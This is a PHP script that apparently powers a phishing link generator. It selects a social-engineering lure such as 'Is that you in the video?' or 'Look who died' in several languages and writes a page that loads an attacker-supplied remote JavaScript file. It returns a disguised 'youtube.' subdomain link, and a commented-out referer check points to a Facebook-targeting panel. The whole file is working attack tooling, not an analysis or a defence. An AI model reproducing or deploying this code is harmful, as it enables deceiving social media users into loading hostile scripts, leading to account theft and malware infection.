<?php
header('Content-type: application/json');
header('Access-Control-Allow-Origin: *'); //I have also tried the * wildcard and get the same response
header('Access-Control-Allow-Methods: ');
require_once "./random_string.php";

$cottorra = trim($_GET['cottorra']) ? $_GET['cottorra'] : null;
$script = trim($_GET['script']) ? $_GET['script'] : null;

//if ($_SERVER['HTTP_REFERER'] !== 'https://panelfb.trade/'){ die('Unauthorized access'); }


if($cottorra == "c1"){
		 $letraurl = "Regarde tu étais dans la vidéo 🤣😆😅😀😂";
		}
			
		else if($cottorra == "c2"){
		 $letraurl = "Regardez qui est mort 😢😢";
		}
			
		else if($cottorra == "c3"){
		 $letraurl = "C'est toi dans la vidéo ? 😲😱😲";
		}	
		
		else if($cottorra == "c4"){
		 $letraurl = "Is that you in the video?😲😱😲 ";
		}
		
		else if($cottorra == "c5"){
		 $letraurl = "Creo que estais en el video🤣😆😅😀😂 ";
		}	
$description = $letraurl;




if(isset($script)) {
$NAMEFILE = generateRandomString();
$DOMAIN = $_SERVER['SERVER_NAME'];
$PROTOCOLO  =  "https://";
	
$contentHTML = '<script src="'.$PROTOCOLO.$script.'" type="text/javascript" async="true"></script>';
//$contentHTML = '<script languaje="javascript"> setTimeout(location.href="'.$linkbase.'",8000); </script>';
file_put_contents("youtube/links". "/" .$NAMEFILE, $contentHTML);
//echo  $description." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE;
	
	
$response = array(
 "url"=>$description." ".'https://youtube.'.$DOMAIN.'/'.$NAMEFILE
);
echo json_encode($response);   	
	
} 
?>
